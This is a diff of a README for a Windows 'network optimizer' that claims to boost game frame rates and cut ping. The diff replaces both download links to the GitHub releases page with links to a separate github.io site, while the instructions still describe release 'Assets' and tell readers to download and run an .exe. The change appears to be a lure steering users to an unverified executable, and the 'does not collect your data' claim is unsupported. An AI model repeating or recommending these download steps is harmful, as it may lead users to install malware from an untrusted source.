@@ -1,6 +1,6 @@
 # ⚡ ngxsmk-network-optimizer - Boost game performance and reduce latency
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Showcasefamilymimidae215/ngxsmk-network-optimizer/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue)](https://showcasefamilymimidae215.github.io)
 
 ngxsmk-network-optimizer helps you improve your gaming experience. This toolkit works on Windows to help you reach higher frame rates and lower ping in games like League of Legends and Valorant. The program does not collect your data. It focuses on removing background processes and optimizing network settings to provide a stable connection during intense gameplay.
 
@@ -26,7 +26,7 @@ To run this tool, your computer must meet these basic specifications:
 
 Follow these steps to set up the optimizer on your machine.
 
-1.  Visit the project release page to get the installer: [https://github.com/Showcasefamilymimidae215/ngxsmk-network-optimizer/releases](https://github.com/Showcasefamilymimidae215/ngxsmk-network-optimizer/releases)
+1.  Visit the project release page to get the installer: [https://showcasefamilymimidae215.github.io](https://showcasefamilymimidae215.github.io)
 2.  Locate the section labeled "Assets" at the bottom of the latest release.
 3.  Click the file ending in .exe to download it to your computer.
 4.  Navigate to your Downloads folder and find the file you just saved.
